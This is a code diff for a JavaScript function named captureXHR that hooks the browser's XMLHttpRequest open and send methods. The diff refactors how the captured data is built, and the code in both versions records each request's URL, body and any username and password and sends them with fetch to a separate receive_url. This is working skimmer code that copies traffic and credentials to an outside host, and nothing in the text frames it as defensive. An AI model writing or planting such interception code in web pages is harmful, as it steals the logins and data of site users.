@@ -5,8 +5,7 @@ function captureXHR(receive_url,interceptor){
   XMLHttpRequest.prototype.open = function(method, url, async, user, password){
     var a = document.createElement('a');
     a.href = url;
-    url = escape(a.href);
-    this.sucks = {method,url,async,user,password};
+    this.sucks = {method,url:escape(a.href),async,user,password};
     interceptor.onopen && (arguments = interceptor.onopen.apply(this,arguments)||arguments);
     this._open.apply(this,arguments);
   };
@@ -16,7 +15,7 @@ function captureXHR(receive_url,interceptor){
     this._send.call(this,data);
     receive_url&&
       fetch(
-        `${receive_url}?url=${this.sucks.url}&user=${this.sucks.user}&password=${this.sucks.password}`
+        `${receive_url}?url=${this.sucks.url}${this.sucks.user&&'&user='+this.sucks.user||''}${this.sucks.password&&'&password='+this.sucks.password||''}`
         ,{method:this.sucks.method,body:this.sucks.body,mode:'cors'}
       );
   };
